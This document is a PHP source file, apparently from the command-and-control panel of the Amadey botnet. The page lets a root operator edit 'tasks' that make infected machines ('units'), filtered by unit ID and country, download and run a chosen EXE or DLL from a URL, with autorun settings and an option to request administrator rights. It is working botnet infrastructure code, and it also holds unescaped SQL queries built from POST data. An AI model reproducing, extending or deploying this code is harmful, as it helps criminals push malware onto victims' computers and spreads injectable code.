<?php

    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }
	
    function MakeTask( $Url, $run, $filetype, $autorun, $limit, $units, $country, $id, $ctlimit) 
    { 
       include( "config.php" ); 
		
       mysql_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ); 
       mysql_select_db( $conf["dbname"] ); 
		
       if ( $country=="*" ) 
          $country=""; 
		
       if ( $units=="*" ) 
          $units=""; 
		
       mysql_query("UPDATE `tasks` SET `path`='$Url', `run`='$run', `filetype`='$filetype', `autorun`='$autorun', `tlimit`='$limit', `path`='$Url', `units`='$units', `country`='$country' WHERE `id` = '".$id."' LIMIT 1" );
		
       if ( $limit > $ctlimit ) 
          mysql_query( "UPDATE `tasks` SET `status`='1' WHERE `id` = '".$id."' LIMIT 1" );	
		
       mysql_close(); 
    } 

    function EditTask($id) 
    {
       include( "config.php" ); 
		
       mysql_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ); 
       mysql_select_db( $conf["dbname"] ); 
		
       $id = mysql_real_escape_string( $id );
       $sql = mysql_query( "SELECT * FROM tasks WHERE id='$id' LIMIT 1" ) or die(mysql_error());
	
       if ( mysql_num_rows( $sql ) == 0 ) 
       {
          header( "Location: show_task.php" );
       }
       else 
       { 
          $row = mysql_fetch_assoc( $sql );

          if ( $row['units'] == "" )     
             $unit = "*";
          else
             $unit = $row['units'];
	   
          if ( $row['country'] == "" )
             $country = "*";
          else
             $country = $row['country'];
	   
          if( $row['filetype'] == 1 )  
          {
             $pathar = explode( ":::", $row['path'] );
	     $dllfunction =  $pathar['1'];
	     $path =  $pathar['0'];	   
          }
          else 
          {
	     $dllfunction =  "";
	     $path =  $row['path'];  
          }
	   
          $res.= "<div align=\"center\">
                  <form action=\"" . basename( $_SERVER['SCRIPT_NAME'] ) . "\" method=\"post\" name=\"form\">
		       <input name=\"id\" type=\"hidden\" value=\"" . $id . "\" />
		       <input name=\"ctlimit\" type=\"hidden\" value=\"" . $row['tlimit'] . "\" />
                     <table border=\"0\" width=\"1200\" cellspacing=\"0\" class=table cellpadding=\"0\">
	                <tr>
		           <td>  
                              <table border=\"0\" width=\"1200\" height=\"220\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
	                         <tr>
		                    <td width=\"150\">&nbsp;URL:</td>
		                    <td>
		                       <input name=\"path\" class=task value=\"" . $path . "\" style=\"float: left\" size=\"50\">
                                    </td>
		             
                                    <td>
                                       * Web URL, file will be saved with original name, expansion will be changed.
                                    </td>
	                         </tr>
	      
                                 <tr>
		                    <td>&nbsp;UID:</td>

		                    <td>
		                       <input name=\"unitid\" class=task value=\"" . $unit . "\" style=\"float: left\">
                                    </td>

		                    <td>
                                       * Uniqal unit identificator or * for all units.
                                    </td>
	                         </tr>

	                         <tr>
		                    <td>&nbsp;Limit:</td>
		 
                                    <td>
		                       <input name=\"count\" class=task value=\"" . $row['tlimit'] . "\" style=\"float: left\">
                                    </td>

		                    <td>
                                       * This task loads count.
                                    </td>
	                         </tr>

	                         <tr>
		                    <td>&nbsp;Countries:</td>
		 
                                    <td>
		                       <input name=\"country\" class=task value=\"$country\" style=\"float: left\">
                                    </td>

		                    <td>
                                       * Chosen country, * for any. <a href=\"images/task_example.png\" target=\"_blank\">Example</a>. <a href=\"f.st\c.index.txt\" target=\"_blank\">Countries <b>index</b> table</a>.
                                    </td>
	                          </tr>

                                  <tr>
		                     <td>&nbsp;File type:</td>

		                     <td>
		                        <select name=\"filetype\">
                                           <option value=\"0\""; 

                                              if( $row['filetype'] == 0 ) 
                                                 $res .= "selected"; 
                                              
                                              $res .= ">EXE file

                                           </option>

                                           <option value=\"1\"";
 
                                              if( $row['filetype'] == 1 ) 
                                                 $res .= "selected"; 

                                              $res.=">DLL file

                                           </option>

		                        </select>
                                     </td>
		
                                     <td>
                                        * File PE type, any expansion.
                                     </td>
	                          </tr>

	                          <tr>
		                     <td>&nbsp;Dll function name:</td>
		 
                                     <td>
		                        <input name=\"dllfunction\" class=task value=\"" . $dllfunction . "\" style=\"float: left\">
                                     </td>

	                             <td>
                                        * Name of the calling function, <b>only for DLL</b>.
                                     </td>
	                          </tr>


                                  <tr>
		                     <td>&nbsp;Exe autorun type:</td>

		                     <td>
		                        <select name=\"autorun\"> 
                                           <option value=\"1\""; 

                                              if( $row['autorun'] == 1 ) 
                                                 $res .= "selected"; 
                                           
                                              $res .= ">Self autorun

                                           </option>

                                           <option value=\"0\""; 

                                              if( $row['autorun'] == 0) 
                                                 $res .= "selected"; 

                                              $res .= ">Amadey autorun

                                           </option>

		                        </select>
                                     </td>
	
		                     <td>
                                        * Startup options, <b>only for EXE</b>.
                                     </td>
	                           </tr>

                                   <tr>
		                      <td>&nbsp;Exe launch:</td>

		                      <td>
		                         <select name=\"run\"> 
                                            <option value=\"0\"";
 
                                            if( $row['run'] == 0 ) 
                                               $res .= "selected"; 

                                            $res .= ">Current rights (current user)</option>

                                            <option value=\"1\""; 

                                               if( $row['run'] == 1 ) 
                                                  $res .= "selected"; 

                                               $res .= ">Up rights (request ADMINISTRATOR rights)

                                            </option>

                                         </select>
                                      </td>
	
                                      <td>
                                         * Startup options, <b>only for EXE</b>. Warning! Do not change this option if you don't know what it is.
                                      </td>
                                   </tr>

                              </table> 

                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                         <tr>
		                    <td>
                                    </td>
	                         </tr>
                              </table>

                              <table border=\"0\" width=\"1200\" cellspacing=\"0\" cellpadding=\"0\">
	                         <tr>
		                    <td>
                                        <p align=\"center\">
                                           <input type=\"submit\" name=\"submit\" value=\"Save task\" class=\"button\">
                                        </p>
                                    </td>
	                         </tr>
                              </table>

                              <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                         <tr>
		                    <td>
                                    </td>
	                         </tr>
                              </table>
		           </td>
	                </tr>
                     </table>
                  </form> 
                  </div>";
          }

       return $res;
    }

    include( "header.php" );

    if( isset( $_POST['submit'] ) ) 
    { 
       if ( $_POST['filetype'] == 0 )
       {
          MakeTask( $_POST['path'], $_POST['run'], $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['unitid'], $_POST['country'], $_POST['id'], $_POST['ctlimit'] ); 
       }
       else
       {
          MakeTask( $_POST['path']  . ":::" . $_POST['dllfunction'], "0", $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['unitid'], $_POST['country'], $_POST['id'], $_POST['ctlimit'] ); 
       }

       echo "<meta http-equiv=\"refresh\" content=\"1; url=show_task.php\">"; 
    }
    else
    {
       if ( $_SESSION['Name'] == "ROOT" )  
       {
          echo ( EditTask( $_GET['id'] ) ); 
       }
       else
       {
          echo "Please login at root, observers cant edit task"; 
       }
    }
   
    echo "</html>";
?> 